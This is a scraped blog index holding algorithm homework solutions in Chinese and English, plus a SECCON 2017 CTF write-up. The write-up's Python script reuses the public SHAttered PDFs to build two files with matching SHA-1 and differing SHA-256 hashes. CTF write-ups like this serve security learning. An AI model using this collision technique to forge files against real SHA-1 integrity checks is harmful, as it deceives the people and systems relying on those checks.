最大獨立集的大小 &#x3D; 頂點總數($|V|$) - 最大匹配 最小團覆蓋 &#x3D; 最大匹配 + 剩下的獨立點 &#x3D; 最大匹配數 + (頂點總數 - 2 * 最大匹配) &#x3D; 頂點總數 - 最大匹配 &#x3D; 最大獨立集的大小 !!! 二分圖的最大匹配：可用「匈牙利演算法」解 各種定義http://blog.csdn.net/Flynn_curry/article/details/52966283二分圖匹配二分圖最大獨立集clique cover 題十三 A path cover of a directed graph $G&#x3D;(V, E)$ is a set $P$ of paths such that every vertex in $V$ is included in at least one path in $P$. A minimum path cover of $G$ is a path cover containing the fewest number of paths. Give an algorithm to find a minimum path cover of a directed acyclic graph. 從DAG建構二分圖，二分圖表示的，就是每個節點的路徑關係，因為不可交路徑不可共用頂點，匹配也不可共用，故可以用匹配來找出最小不可交路徑覆蓋。 最小不可交路徑覆蓋 &#x3D; 原圖節點數 - 對應的二分圖的最大匹配數 最小相交路徑覆蓋：我們可以先幫圖加邊，如果有路徑1-&gt;2-&gt;3，我們就直接新增一條邊1-&gt;3，然後再用最小不可交路徑覆蓋的方法，就可以求得相交路徑覆蓋。 解法前置解法解法","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"Advance-Algorithm::homework5","slug":"Advance-Algorithm-homework5","date":"2018-01-15T03:23:27.000Z","updated":"2020-07-05T12:28:17.000Z","comments":true,"path":"tw/Advance-Algorithm-homework5/","permalink":"http://blog.terrynini.tw/tw/Advance-Algorithm-homework5/","excerpt":"建議如果看不懂算法的話可以拿起紙筆操作，因為我有點懶不想要畫圖。","text":"建議如果看不懂算法的話可以拿起紙筆操作，因為我有點懶不想要畫圖。 題一 Suppose we wish not only to increment a counter but also to reset it to zero (i.e., make all bits in it 0). Counting the time to examine or modify a bit as $O(1)$, show how to implement a counter as an array of bits so that any sequence of n INCREMENT and RESET operations takes time $O(n)$ on an initially zero counter. (Hint: Keep a pointer to the high-order 1.) 聚集分析 n-INCREMENT (aggregate analysis)從計數 m 到計數 m+1 並不是每一個位元都會改變，而以前我們鬆散的估計就說有可能每一個位元都會改變 , 例如 01111111 變成 10000000。事實上 仔細觀察： A[0] 位元每間隔 $2^0$ 次 計數改變一次 A[1] 位元每間隔 $2^1$ 次 計數改變一次 A[2] 位元每間隔 $2^2$ 次 計數改變一次 … A[k] 位元每間隔 $2^k$ 次 計數改變一次 $\\frac{n}{2^0}+\\frac{n}{2^1}+\\frac{n}{2^2}+…+\\frac{n}{2^k}≤2n$因此 $T(n)&#x3D;O(2n)&#x3D;O(n)$ RESET直接整個A[]從頭到尾歸0 $\\rightarrow O(n)$ CASE STUDY 2 : Incrementing a binary counter 題二 Show how to implement a queue with two ordinary stacks so that the amortized cost of each Enqueue and Dequeue operation is $O(1)$. 在攤銷式分析下，inqueue及dequeue的時間複雜度為$O(1)$ pseudo123456789instack, outstackpush(val) instack.push(val)pop() &#123; if(outstack.empty) while(!instack.empty) outstack.push(instack.pop()) return outstack.pop();&#125; by Accounting Method (記帳方法) 實際代價：Push: total = 1 instack_push: 1Pop : total = 2*instack_size + 1 instack_pop_to_empty: instack_size outstack_push : instack_size outstack_pop : 1平攤代價(amortized cost):Push: 4 each element just has at most 4 steps: instack_push : 1 instack_pop : 1 outstack_push: 1 outstack_pop : 1Pop : 0T(n) &lt;= 4n, T(n)/n &lt;= 4 → O(1) 題三 Consider an ordinary binary min-heap data structure with n elements supporting the instructions INSERT and EXTRACT-MIN in $O(lgn)$ worst-case time. Give a potential function $\\Phi$ such that the amortized cost of INSERT is $O(lgn)$ and the amortized cost of EXTRACT-MIN is $O(1)$ and show that it works. let $\\Phi(H) &#x3D; \\sum\\limits_{i \\in H} w_i$ , where $H$ is the binary min heap, $w_i$ &#x3D; depth of element $i \\in H$.let $c_i &#x3D;$ 第 $i$ 個操作的實際成本, $n &#x3D; H$的元素數 INSERT: insert element at most depth $logn$ &amp; bubble up a. insert new element: $c_i + \\Phi(H_i) - \\Phi(H_{i-1}) \\leq O(logn) + O(logn)$ b. bubble up: $c_i + \\Phi(H_i) - \\Phi(H_{i-1}) \\leq O(logn) + 0$ total &#x3D; $O(logn)$ EXTRACT-MIN: remove root node &amp; bubble up a. remove root: $c_i + \\Phi(H_i) - \\Phi(H_{i-1}) \\leq O(1) + 0$ b. bubble up: $c_i + \\Phi(H_i) - \\Phi(H_{i-1}) \\leq O(logn) + O(-logn)$ total &#x3D; $O(1)$ reference 題四 Design a data structure to support the following two operations for a dynamic multi-set $S$ of integers, which allows duplicate values:INSERT(S, x) inserts $x$ into $S$.DELETE-LARGER-HALF(S) deletes the largest $\\lceil \\frac{|S|}{2}\\rceil$ elements from $S$.Explain how to implement this data structure so that any sequence of m INSERT and DELETE-LARGER-HALF operations runs in $O(m)$ time. Your implementation should also include a way to output the elements of $S$ in $O(|S|)$ time. 資料結構：課堂上說是dynamic table（就是c++裡面的vector的概念） $INSERT(S,x)$：直接放在陣列最後面 $DELETE-LARGER-HALF(S)$ : 用median-of-medians算法，可以在$O(n)$內找到中位數，然後再花$O(n)$的時間把大的一半刪掉。 中位數演算法 題五 Suppose that in the dynamic table operations, instead of contracting a table by halving its size when its load factor drops below 1&#x2F;4, we contract it by multiplying its size by 2&#x2F;3 when its load factor drops below 1&#x2F;3. What is the amortized cost of a TABLE-DELETE that uses this strategy? 基本上potential method中的實際成本跟aggregate method中定義的是一樣的東西，只是aggregate用趨近無限的算法來算，potential則是用態勢函數來計算。 potential function 中的 $|2*num[T] - size[T]|$來自於accounting method，根據第一個reference，前$\\frac{n}{2}$個元素存款為0，後面存款為2，刪除操作亦相同，只是存款為1。 比較好的原始版本(但沒有contract)完整優質版本這題的解答 題六 Study the famous KMP algorithm for the string matching problem and give an amortized analysis of the algorithm. 假設字串$T$, $P$, $|T| &gt; |P|$利用stack來存放已比對到的相同字元 push:比對相同的字元 pop :挪動 $P$ 一格 multi-pop(k):挪動 $P$ k格 因此對應到stack的攤銷分析：(記帳法) push = 2 pop = 0 multi-pop(k) = 0 total $\\leq O(2|T|)$ 建立 $F$ 函式時，同理 total $\\leq O(2|P|)$ 所以總和 &#x3D; $O(|T|+|P|)$ 演算法筆記PTT莫名其妙找到的Z array算法 題七 Given an array $a[1\\dots n]$, for each position in the array, search among the previous positions for the last position that contains a smaller value. That is, for each position $i$, $1 \\leq i \\leq n$, find the largest possible index pi such that $p_i &lt; i$ and $a[p_i] &lt; a[i]$. For convenience, we attach a dummy element $a[0] &#x3D; -\\infty$. Then, each $p_i$, $1 \\leq i \\leq n$, is well-defined. Design a linear time algorithm to solve this problem. 題目給一個陣列，要求對每一個元素：往陣列前面找一個比現在這個元素還小的元素，然後其index越大越好，並且題目定義array[0]為負無限 作法：從尾巴開始拜訪，把不知道解答的元素都推進stack裡面，最後就會知道解了 a[1...n] = 輸入的陣列a[0] = -INFpl[1...n] = [0...0]stack = []for i = n to 1 while !stack.empty() &amp;&amp; a[i] &lt; a[stack.top()] pl[stack.pop()] = i stack.append(i)return pl 類似的題目 題八 Binary search of a sorted array takes logarithmic search time, but the time to insert a new element is linear in the size of the array. We can improve the time for insertion by keeping several sorted arrays. Specifically, suppose that we wish to support SEARCH and INSERT on a set of n elements. Let $k &#x3D; \\lceil lg(n+1)\\rceil$, and let the binary representation of $n$ be $&lt; n_{k-1}, n_{k-2}, \\dots , n_{0}&gt;$. We have k sorted arrays $A_0, A_1, \\dots , A_{k-1}$, where for $i &#x3D; 0, 1, \\dots, k-1$, the length of array $A_i$ is $2^i$. Each array is either full or empty, depending on whether $n_i &#x3D; 1$ or $n_i &#x3D; 0$, respectively. The total number of elements held in all k arrays is therefore exactly n. Although each individual array is sorted, elements in different arrays bear no particular relationship to each other.a) Describe how to perform the SEARCH operation for this data structure. Analyze its worst-case running time.b)Describe how to perform the INSERT operation. Analyze its worst-case and amortized running times.c) Discuss how to implement DELETE. 假設輸入有$n$個元素，則我們令$k&#x3D;\\lceil log(n+1)\\rceil$，表示$n$化為二進位所需要的位元數，並依此宣告多個陣列$A_0,A_1,A_2, \\dots ,A_{k-1}$，每個陣列的長度為$2^i$，對應n在二進位時的第i個位元，依照其對應的位元如果是1就裝滿否則不作使用，而且每個陣列內的元素是排列過的，但兩陣列間的元素沒有絕對的關係存在(這裡為方便表示，陣列內的index從1開始)。 SEARCH : 找出所有使用中的陣列，對其做二分搜 複雜度： 最差情況我們需要看過每個陣列，且每個陣列成本為$O(log(2^i))&#x3D;O(i)$ 因此複雜度為$\\sum_{i&#x3D;0}^{k}O(i)&#x3D;O(k^2)&#x3D;O(log^2n)$ 12345678910Search(A, n, key) i = 0 while n &gt; 0 do if n is odd then pos = BSearch(A_i, 2^i , key) if pos != 0 then return (i; pos) n = n/2 i = i + 1 return &quot;not found&quot; INSERT : 插入元素會使n增加，意味著我們必須搬動陣列，以符合其二進位的變化 每次插入元素使$n+1$，則從LSB起，連續的1都將進位為0，因此我們要從LSB起找第一個0 定義 $Merge(A_a,A_b,A_c)$，將陣列$A_a,A_b$合併後放進$A_c$ 複雜度 (aggregate method): 每個$B_i$陣列產生的成本來自Merge為$O(2^i)$ 假設我們從$n&#x3D;1$一直INSERT元素直到$n&#x3D;N$，這中間$B_i$共會被產生$\\lfloor\\frac{N}{2^i}\\rfloor$次 得$\\sum_{i&#x3D;0}^{k-1}\\lfloor\\frac{N}{2^i}\\rfloor O(2^i)\\leq \\sum_{i&#x3D;0}^{k-1}O(2^k)\\leq O(2^kk) &#x3D; O(NlogN)$ 因此本操作的平攤代價為 $\\frac{O(NlogN)}{N} &#x3D; O(logN)$ 12345678Insert(A, n, e) i = 0 B_0 = &#123;e&#125; while n is odd do Merge(A_i, B_i, B_i+1) n = n/2 i = i + 1 A_i = B_i DELETE : 由於刪除元素導致n減少，從LSB起，連續的0都將借位得1，因此我們要從LSB起找第一個1，並將其中的元素拆分到較低位的陣列當中 定義Replace($A_i$, pos, e)可以將原本$A_i[pos]$元素替代為$e$，並且保證使陣列處於排序過的狀態 這裏pseudo code中的$A_i[j:k]$，表示取$A_i$中第j個到第k個元素(包括k) 使用陣列中最高的值$A_k[2^k]$來進行取代，在拆分時只取$A_k[1:2^k-1]$ 123456789101112Delete(A, n, i, pos) k = 0 while n is even do n = n/2 k = k + 1 if i = k then Replace(A_k[1 : 2^k - 1], pos, A_k[2^k]) else Replace(A_i, pos, A_k[2^k]) for i = 0 to k do A_i = A_k[2^i : 2^(i+1)-1] A_i = &#123;&#125; SEARCH: $O(log^2 n)$ INSERT: $O(logn)$ DELETE: 題目沒要求 reference","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"Advance-Algorithm::homework4","slug":"Advance-Algorithm-homework4","date":"2018-01-15T02:03:40.000Z","updated":"2020-07-05T12:48:13.000Z","comments":true,"path":"tw/Advance-Algorithm-homework4/","permalink":"http://blog.terrynini.tw/tw/Advance-Algorithm-homework4/","excerpt":"建議如果看不懂算法的話可以拿起紙筆操作，因為我有點懶不想要畫圖。","text":"建議如果看不懂算法的話可以拿起紙筆操作，因為我有點懶不想要畫圖。 題一 For two points $p$ and $q$ in the plane, we say that $p$ dominates $q$ if both $x$ and $y$ coordinates of $p$ are no less than that of $q$ respectively. Given a set $S$ of $n$ points, the rank of a point $p$ in $S$ is the number of points in $S$ dominated by $p$. We want to find the rank of every point in $S$. A naïve algorithm needs $O(n2)$ time. Design a faster algorithm for this problem. 一個點支配另外一個點，表示他的$x,y$都要比另外一個點大，因此將所有的點照$x$軸升冪排序後，我們可以確定$x$是遞增的，因此若右半面某點$P_r$的$y$比左半面某點$P_l$的y還大，則我們知道$P_r$支配$P_l$，同時$P_r$也支配$P_l$所支配的所有點。 複雜度：$T(n)&#x3D;2T(n&#x2F;2)+c_1nlogn+c_2nlogn \\Rightarrow O(nlog^2n)$ 然後我發現這有點蠢，其實y軸預先排序好就好了，這樣你只要做一次$O(nlogn)的排序。 所以 $T(n)&#x3D; 2T(\\frac{n}{2}) + O(n)$ 複雜度等於 $O(nlogn) + O(n) &#x3D; O(nlogn)$ Algorithm 二維求秩演算法(分治) Input: n個二維平面點所構成的集合$S$，$n\\geq 1$ Output: 集合$S$中所有點的秩(rank) 步驟1: 若$n&#x3D;1$，則回傳$S$中唯一一個點的秩為0並結束。步驟2: 找出所有點的X軸中位數(median)畫出垂直於X軸的直線L，將S中的點分為二個集合$S_L$與$S_R$。步驟3: 遞迴地使用二維求秩演算法分別求出$S_L$與$S_R$中所有點的秩。步驟4: 根據Y軸值排序所有在$S$中的點，依序由小而大掃描所有點，求出每一個在$S_R$的點$i$前面有多少個$S_L$的點(記為$update_i$)，$rank(i) +&#x3D; update_i$，最後回傳$S$中所有點的秩。 題二 An array $A[1\\dots n]$ contains all the integers from 0 to n except one integer. It would be easy to determine the missing integer in $O(n)$ time by using an auxiliary array $B[0\\dots n]$ to record which numbers appear in A. In this problem, however, we cannot access an entire integer in A with a single operation. The elements of A are represented in binary, and the only operation we can use to access them is “fetch the jth bit of $A[i]$,” which takes constant time. Show that if we use only this operation, we can still determine the missing integer in $O(n)$ time. 利用 Most significant bit (MSB) 進行二分搜尋 一個非負整數$n$，我們需要使用$\\lceil log(n+1)\\rceil$個bits來表示他 這裡將 LSB 編號為 1，MSB編號為$\\lceil log(n+1)\\rceil$ 如果我們有一串連續的整數$0\\sim n$，則會有 $2^{(\\lceil log(n+1)\\rceil -1)}$個數字小於$2^{(\\lceil log(n+1)\\rceil -1)}$ 重點： 在確認缺少的數字是在A或B堆時，其實我們也是在1 bit 1bit拼出缺少的整數，例如:如果我們有0,1,2,4，則我們執行會得到缺少的數在A、B、B，也就是$011_{2}&#x3D;3_{10}$。 複雜度：$T(n) \\leq T(2 ^ { \\lceil{log(n+1)}\\rceil − 1} − 1) + cn$ 以$\\lceil log(n+1)\\rceil$，即MSB，是否為0作標準將數字分為A(0)，B(1)兩堆， 判斷A堆的大小是否為$2^{(\\lceil log(n+1)\\rceil -1)}$，如果不是，跳到步驟4 表示缺少的數字應該出現在B堆，讓B為新的搜尋範圍，回到第一步 表示缺少的數字應該出現在A堆，讓A為新的搜尋範圍，回到第一步 reference 題三 Assume there are n supposedly identical VLSI chips that are capable of testing each other. There is a test jig that can accommodate two chips at a time. When the jig is loaded, each chip tests the other and reports whether it is good or bad. A good chip always reports accurately whether the other chip is good or bad, but the answer of a bad chip cannot be trusted. Show that the good chips can be identified with $O(n)$ pairwise tests, assuming that more than $\\frac{n}{2}$ of the chips are good. A says B says Conclusion B is good A is good 2 good or 2 bad B is good A is bad at least 1 bad B is bad A is good at least 1 bad B is bad A is bad at least 1 bad （題目假設超過n/2為好的晶片）步驟1: 將全部chip兩兩配對，然後做測試，若為奇數，則多的一個這輪先閒置步驟2: 捨棄測試結果出現bad的兩晶片步驟3: 測試結果為兩個good的，捨棄其中任意一張 （使好晶片的數量維持超過n/2）步驟4: 重複以上操作直到剩下1或2張晶片，則剩下的晶片必是好的從以上操作可得到一張好的晶片，故只要拿這張晶片測試想要測試的晶片，便可以馬上確定是不是好晶片。 簡單論證：超過$\\frac{n}{2}$為好的晶片下最差的狀況是有$\\frac{n}{2}-1$張壞晶片，既使在此情況下，如果我們故意把一張好的配一張壞的，也必定會有一組是兩張真正好的(表格表示的是晶片真正的狀態)： A B good bad good bad good bad good good 如果我們亂分，有超過一組晶片是互説好的，我們會知道一定有一組是兩張壞的，但於此同時必然會產生另外一組好的： A B good bad good good bad bad good good 如果組合2,3,4都回報一切正常，這時照演算法的步驟3把每個配對中的任一個移除，消減數量並且讓good保持在超過$\\frac{n}{2}$，可以知道一直重複做下去會只剩下好的，其實就是簡單的鴿籠原理，我們只有$\\frac{n}{2}$個配對數（籠子），但是卻有超過$\\frac{n}{2}$個好晶片（鴿子），必有兩好晶片在同一個配對中。 複雜度：$T(n) \\leq T(\\lceil{n&#x2F;2}\\rceil) + \\lfloor{n&#x2F;2}\\rfloor$ &#x3D; O(n) reference 題四 Let T and P be two sequences such that $|P| \\leq |T|$. Design a linear time algorithm to determine whether $P$ is a subsequence of $T$. 水題 題五 Given a sequence $S$ of n nonnegative numbers $x_1, x_2, \\dots , x_n$, and an integer $k$, partition $S$ into $k$ or fewer consecutive subsequences such that the largest sum of these subsequences is minimized over all possible partitions. 整體概念是二分搜尋法＋貪婪法，先設定一個上限值$(upper+lower)&#x2F;2$，然後依序把每群塞滿，塞到不超過上限值，最後k群都塞滿後檢查此解是否正確（每個數字都有被塞進一個群體裡面），如果此解正確的話就 $upper\\leftarrow(upper+lower)&#x2F;2$，一直做到 $lower \\geq upper$，就能得到最小最大值。 1: 先指派二分搜尋用的上下界： upper = sum of elements in sequence lower = 整個sequence中最大的元素 （可以指派為0，但是會多做幾次）2: 指定一個界限 = (upper + lower)/23: 接下來從sequence的頭開始分群（蘋果依序放入籃子的概念） 如果目前這個群再多放下一個數字就會超過界限的話就放進下一個群，直到每個群都裝滿4: 檢查是不是sequence中的每個數字都有被分到某一群 都有分到的情況： 把upper變為 (upper + lower)/2 否則： 把lower變為 (upper + lower)/2 + 15: 如果lower &lt; upper 則回到步驟 2 題六 You have inherited the publishing rights to n songs by the Raucous Rockers. You want to release a boxed set of d compact disks, each of which can hold at most m minutes of music. To satisfy the fans, you must put the songs in chronological order, but you can omit songs (regardless of when they were recorded) if necessary. Of course, no song can be split across a disk. Given a list of the song lengths in chronological order, your task is to figure out the maximum number of songs that can be recorded on the set of disks subject to these criteria. 你有n首歌，然後有d張光碟，每個光碟統一最多放m分鐘的音樂，題目會依照年份給排序過的歌單，要求在依照年份排序且每首歌不可以分在兩片CD的情形下，找出能存放最多首歌的組合。 先定義DP陣列為 dp[i][j][k] 表示有i首歌要放入第j張光碟，且該光碟容量為k時最多可以放幾首歌的情形，並定義第i首歌的長度為 minute[i]。如同01背包，就是在考慮這首歌該不該放進去這張cd的情形 空間複雜度尚未優化的方法： 邊界條件：DP陣列初始全為0遞迴關係： 不放入： dp[i][j][k] = dp[i-1][j][k], if minute[i] &gt; k 放入時: a.如果要當該光碟的第一首歌，應該找上一張光碟裝滿的狀態: dp[i-1][j-1][k]+1 b.如果不想當該光碟的第一首歌，應該找該光碟的上一首歌： dp[i-1][j][k-minute[i]]+1 因此式子應該為 dp[i][j][k] = max(a,b)答案：dp[n][d][m] 空間優化的方法就跟背包問題一樣，反正他i是越來越大，所以可以降一維。 老師：P[i,j] &#x3D; n，前i首選了j首，可以放n張唱片 題七 Solve “Bitonic Euclidean traveling-salesman problem” in chapter 15 of the book [CLRS]. 給一堆點有 x, y 座標，要求設計一個路線讓銷售員可以在x軸上嚴格遞增的到最右邊的點，然後在x軸上嚴格遞減的到最左邊的點，每個點都必須被拜訪，求最短的走法。(沒有相同的x座標) 老師：如果 $P_n$ 跟 $P_{n-1}$ 是一定要連的話，就先把那個邊消掉，把問題改成解 $P_n$ 到 $P_{n-1}$ 解法-英文 解法-中文 題八 Consider the activity-selection problem appears in p.41 of unit-5. Now, assume that each given activity is associated with a positive weight. Design an algorithm to find an independent subset of activities (activities that can be allowed to use the same resource) whose sum of weights is maximized. DP 首先講所有活動按照結束時間排序，然後將它們編號成$1\\sim n$ 最每個活動找出一個，不會跟他衝突，且index最大的活動出來，假設為$i$，則表示目前這個活動絕對不會跟$1~sim i$產生衝突（因為我們是照結束時間排序，不可能目前活動的開始時間跟$i$沒有交集但是跟$i-1$有交集)。 對於每個活動作類似背包為題的做法，對活動j有兩種情況：有j在解當中，沒有j在解當中，遞迴下去可得解。 解法 題九 Solve Problem 10003 “Cutting Sticks” in the ACM web site. 英文題目 中文題目 給定一個長度 $l$ 的木棒，必須將其切斷 $n$ 次，切斷的位置分別為 $c_1$~ $c_n$，($0 &lt; c_i &lt; l$)。每切一刀的成本為「切斷前」該木棒的長度，求達成目標所需的最小成本。 cost[x,y] = min(i = x+1 ~ y-1) &#123; cost[x,i] + cost[i,y] + (c[y] - c[x]) &#125;(0 &lt;= x, y &lt;= n+1, c[0] = 0, c[n+1] = l)example: l = 10 n = 4c[] = 4 5 7 8The minimum cutting is 22.-1 0 5 10 15 22-1 -1 0 3 7 12-1 -1 -1 0 3 8-1 -1 -1 -1 0 3-1 -1 -1 -1 -1 0-1 -1 -1 -1 -1 -1 題十 Given a list of n positive integers d1, d2, …, dn, we want to efficiently determine whether there exists a simple undirected graph whose nodes have degrees precisely d1, d2, …, dn. Design an algorithm to solve this problem. 貪婪法(有數學解) 1. 從degree最大的點開始，當作x2. 把除了x以外degree最大的幾個點與x link3. 找degree次大的點作為x，回到步驟二直到沒有剩下任何一點 老師：放這裡應該是貪婪 morris’s blog (p35)Erdős–Gallai_theorem 題十一 Given a weighted graph, find a spanning tree such that the maximal edge weight of the tree is minimized over all spanning trees. $O(|E|log|V|)$ : by Kruskal’s algorithm： A MST is necessarily a MBST, but a MBST is not necessarily a MST.所以我們可以直接用 Kruskal’s algorithm 來找MST，同時他也會是MBST。 $O(|E|)$ : by Camerini’s algorithm 1. 將圖中所有的邊分成兩半，其中一半的所有邊的weight都不大於另一半中任意一個邊的weight2. 檢查以weight較小的的半邊和所有點組合出的subgraph(G_s)： (1) if G_s is connected: 代表G_s的MBST就是G的MBST，以G_s當作輸入回到步驟1. (2) else: 將各個connected compont視為一個super vertex (a) if 只剩下2個super vertex和1個邊: 將他們連接後即為MBST (b) else: 以這個新的圖G&#x27;當作輸入回到步驟1. 演算法筆記 - Minimum Bottleneck Spanning Tree Wikipedia - Minimum Bottleneck Spanning Tree 題十二 Solve Problem 11264 “Coin Collector” in the ACM web site. 英文題目 中文題目 $Sum(i-1) &lt; c[i]$是多餘的條件，因為會被上一步的$Sum(i) &#x3D; Sum(i-1)+c[i] &lt; c[i+1]$所覆蓋 思路：（貪婪）1. 面值最大的硬幣c[n-1]必選。（反證：如果兌換了x元卻沒有選中它，可知 x &lt; c[n-1]，於是用 x+c[n-1] 元去兌換可以得到一個更好解。）2. 假設Sum(i)是c[1]~c[i]中被選中的貨幣的面額和，那麼一定有Sum(i) &lt; c[i+1]。（反證：若 Sum(i) &gt;= c[i+1]，那銀行肯定會給他c[i+1]面值的硬幣。）3. 按照2.中所說，如果有 Sum(i) = Sum(i-1)+c[i] &lt; c[i+1]，那麼c[i]將被選中，構築選取序列。example:n = 6c[1~n] = 1 3 6 8 15 20Sum(i) = 1 v v // 頭尾先選 Sum(i) = 1 4 v v vSum(i) = 1 4 10 v v vSum(i) = 1 4 -&gt; 11 v v v vSum(i) = 1 4 -&gt; 11 26 v v v vSum(i) = 1 4 -&gt; 11 -&gt; 20 // 到底了，選取完畢 reference","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"2017::SECCON::Write-up","slug":"2017-SECCON-Write-up","date":"2017-12-17T23:39:47.000Z","updated":"2021-03-22T19:02:39.000Z","comments":true,"path":"en/2017-SECCON-Write-up/","permalink":"http://blog.terrynini.tw/en/2017-SECCON-Write-up/","excerpt":"","text":"SHA-1 is dead - 100 point SHA-1 is dead http://sha1.pwn.seccon.jp/ Upload two files satisfy following conditions: file1 != file2 SHA1(file1) == SHA1(file2) SHA256(file1) &lt;&gt; SHA256(file2) 2017KiB &lt; sizeof(file1) &lt; 2018KiB 2017KiB &lt; sizeof(file2) &lt; 2018KiB * 1KiB = 1024 bytes Just download sha1 collision pdf made by Google, then concatenate it with something.Actually we don’t need to check the result of SHA-256 of two pdf……Maybe wa can find a SHA-256 collision? import requestsimport urllib2from hashlib import sha1from hashlib import sha256import urllibpdf1 = urllib2.urlopen(&quot;http://shattered.io/static/shattered-1.pdf&quot;).read()[:500]pdf2 = urllib2.urlopen(&quot;http://shattered.io/static/shattered-2.pdf&quot;).read()[:500]pdf1 = pdf1.ljust( 2065409, &quot;\\00&quot;) #padding pdf to 2017Kib + 1pdf2 = pdf2.ljust( 2065409, &quot;\\00&quot;)while True: check1 = sha256(pdf1).hexdigest() check2 = sha256(pdf2).hexdigest() if check1 != check2: break else: pdf1 = pdf1+&quot;\\00&quot; pdf2 = pdf2+&quot;\\00&quot;file1 = open(&quot;upload1&quot;,&quot;w&quot;)file2 = open(&quot;upload2&quot;,&quot;w&quot;)file1.write(pdf1)file2.write(pdf2)print sha1(pdf1).hexdigest()print sha1(pdf2).hexdigest()print sha256(pdf1).hexdigest()print sha256(pdf2).hexdigest()print len(pdf1)print len(pdf2)","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://blog.terrynini.tw/tags/CTF/"},{"name":"SECCON","slug":"SECCON","permalink":"http://blog.terrynini.tw/tags/SECCON/"}]},{"title":"Advance-Algorithm::homework3","slug":"Advance-Algorithm-homework3","date":"2017-11-15T10:40:25.000Z","updated":"2020-07-05T12:54:35.000Z","comments":true,"path":"en/Advance-Algorithm-homework3/","permalink":"http://blog.terrynini.tw/en/Advance-Algorithm-homework3/","excerpt":"No I didn’t backup problems…","text":"No I didn’t backup problems…","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"Advance-Algorithm::homework2","slug":"Advance-Algorithm-homework2","date":"2017-11-14T17:58:55.000Z","updated":"2020-07-05T13:03:56.000Z","comments":true,"path":"en/Advance-Algorithm-homework2/","permalink":"http://blog.terrynini.tw/en/Advance-Algorithm-homework2/","excerpt":"","text":"problem 3 Given an integer (not necessary a decimal number) with n digits, we want to remove $m (\\le n)$ digits from this number such that the resulting number is as large as possibe. Design an $O(n)$ time algorithm to solve it. problem 4 Given a 2-dimensional nn array (or matrix) of 0&#x2F;1 integers, design a linear time algorithm to find a sub-square (a sub-square matrix with consecutive indices in both dimensions) with the largest size such that all the elements in the sub-square are equal to 1. problem 5 Use the standard divide-and-conquer stratege to solve the max substring sum problem discussed in Unit 4; i.e. divide the given sequence evenly and then solve the two subproblems recursively. Is it still possible to solve the problem in linear time? problem 6 Let x1, x2, … , xn be a sequence of real numbers (not necessarily positive). Design an algorithm to find a substring xi , xi+1, …, xj such that the product of the numbers in it is maximum over all substrings. The product of the empty substring is defined as 1. problem 7 Given a sequence of real numbers x1, x2, …, xn (not necessarily positive), n  1, and an integer L, 1  L  n, design an algorithm to find a substring xi, xi+1, …, xj such that its length ji+1 L and the sum of the numbers in it is maximum over all substrings with length not greater than L. Your algorithm should run in O(n) time (note: not O(nL)). problem 8 Given a sequence of objects where each object is associated with a value and a weight, design an algorithm to find a subsequence such that its corresponding value sequence is increasing and its weights’ sum is maximized. problem 9 Design an algoritm to solve Problem 10154 “Weights and Measures” in the web site: http://acm.uva.es/problemset/. problem 10 Given a 2-dimensional nn matrix M of real numbers, design an efficient algorithm to find a sub-rectangle such that the sum of the numbers in it is maximal over all sub-rectangles of M. Here, each sub-rectangle is an n1n2 (1 n1, n2  n) matrix with consecutive indices of rows and columns. problem 11 Given a sequence of integers, and k another integer, design an algorithm to find a substring such that the sum of the numbers in it is exactly k if there does exist such a substring.","categories":[{"name":"Note","slug":"Note","permalink":"http://blog.terrynini.tw/categories/Note/"}],"tags":[{"name":"Algorithm","slug":"Algorithm","permalink":"http://blog.terrynini.tw/tags/Algorithm/"}]},{"title":"Advance-Algorithm::homework1","slug":"Advance-Algorithm-homework1","date":"2017-11-12T19:56:41.000Z","updated":"2024-06-20T16:45:59.592Z","comments":true,"path":"en/Advance-Algorithm-homework1/","permalink":"http://blog.terrynini.tw/en/Advance-Algorithm-homework1/","excerpt":"整理一下何錦文教授高等演算法課上的作業。作業題目好像都不太會變的樣子？所以如果你有參考我整理的題目的話，留個言讓我知道我做功德了♥有什麼問題都可以在下面留言討論，私訊我也可以。 Written in English.","text":"整理一下何錦文教授高等演算法課上的作業。作業題目好像都不太會變的樣子？所以如果你有參考我整理的題目的話，留個言讓我知道我做功德了♥有什麼問題都可以在下面留言討論，私訊我也可以。 Written in English. problem 1 Recall the recursive program (discussed in the class) that computes the n-th Fibonacci number. Compute the number of additions used by the program. $$ T(1) = 0$$ $$ T(n) = T(n-1) + T(n-2) + 1 $$ $$ T(n) < 2T(n-1) + 1 = 4T(n-2) + 2 + 1 = 8T(n-3) + 4 + 2 + 1 $$ $$ T(n) < 2^kT(n-k) + \\frac{(1-2^k)}{1-2} $$ $$ if\\;n-k=1,k=n-1$$ $$ O(T(n)) = O( 2^{n-1}T(1) + \\frac{1-2^{n-1}}{1-2} ) = O(2^n) $$ problem 2 Determine the space complexity of the quicksort algorithm. For in-place quick sort, space complexity is determined by stacks used by recursive call. The best case, it needs O(logn) recursive call to sort, the space complexity is O(logn). The worse case, it needs O(n) recursive call to sort, the space complexity is O(n). We know the the average case of quick sort is that it need O(logn) recursive call, so the space complexity of quicksort is O(logn). problem 3 Derive an exact closed formula of the merge sort recurrence relation $T(n): T(n) &#x3D; T(\\lfloor \\frac{n}{2} \\rfloor) + T(\\lceil \\frac{n}{2} \\rceil) + n-1, T(1) &#x3D; 0$ $$ T(n) = 2T(\\frac{n}{2}) + n-1 = 4T(\\frac{n}{4}) + n-2 + n-1 = 8T(\\frac{n}{8}) + n-4 + n-2 + n-1 $$ $$ T(n) = 2^kT(\\frac{n}{2^k}) + kn + \\frac{1-2^k}{1-2} $$ $$ if \\frac{n}{2^k} = 1 , k = log_2(n) $$ $$ T(n) = 